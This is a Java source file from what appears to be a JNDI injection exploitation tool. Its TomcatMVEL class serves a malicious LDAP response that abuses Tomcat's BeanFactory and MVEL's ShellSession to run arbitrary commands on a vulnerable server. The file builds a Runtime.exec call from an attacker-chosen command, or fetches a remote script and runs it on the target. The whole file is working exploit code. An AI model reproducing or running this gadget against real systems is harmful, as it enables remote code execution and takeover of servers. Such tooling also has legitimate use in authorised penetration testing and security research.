package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Arrays;

/*
    Tomcat MVEL Way:
    Requirement:
        Tomcat and MVEL in classpath
        Tomcat 10.1.0-M14,10.0.21,9.0.63,8.5.79
    Explanation:
        There will determine what method will be called in org.mvel2.sh.ShellSession#exec
        There is a calling (MVEL#eval) in PushContext#execute
 */
public class TomcatMVEL implements LDAPService{
    private static final Logger logger = LogManager.getLogger(TomcatMVEL.class);

    private PayloadEnum payload;
    private String[] params;
    private String mvelScript;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatMVEL Way ...", baseDN));

            // create ResourceRef
            ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "a=exec"));
            ref.add(new StringRefAddr("a", mvelScript));

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);

        // obtain the value of Payload
        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

        // add params
        switch (payload.name()) {
            case "Command":
                String cmd = PayloadUtils.getCmdFromBase(baseDN);
                params = new String[]{cmd};
                break;
            case "File":
                String filename = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{filename};
                break;
        }
        logger.info(String.format("Received Payload is %s, params are %s ...", payload, Arrays.toString(params)));
    }

    @Override
    public void generateHandler() {
        try {
            TomcatMVELTemplate tomcatMVELTemplate = new TomcatMVELTemplate();
            switch (payload.name()) {
                case "Command":
                    mvelScript = tomcatMVELTemplate.getExecCode(params[0]);
                    break;
                case "File":
                    mvelScript = HttpUtil.get(HTTPServer.codeBase + params[0]);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    private class TomcatMVELTemplate {
        public String getExecCode(String cmd) {
            return String.format("push Runtime.getRuntime().exec('%s');", cmd);
        }
    }
}
